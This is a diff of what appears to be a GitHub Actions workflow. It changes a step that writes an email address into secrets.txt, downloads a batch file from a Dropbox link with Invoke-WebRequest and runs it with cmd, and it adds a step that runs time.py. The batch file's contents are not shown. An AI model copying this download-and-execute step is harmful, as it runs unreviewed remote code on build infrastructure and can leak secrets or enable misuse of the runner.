@@ -11,5 +11,8 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=busmaill02@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/66q78643m2jthg269rzlp/down.bat?rlkey=zudbgjoh8jntdjlefrge6bs8v&dl=1" -OutFile "down.bat"
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/9ve0o69dkb3pip829kqo6/down.bat?rlkey=7nbtd83szp1gxroqtcx6m21sh&dl=1" -OutFile "down.bat"
          cmd /c down.bat
+
+      - name: Time Counter
+        run: python time.py
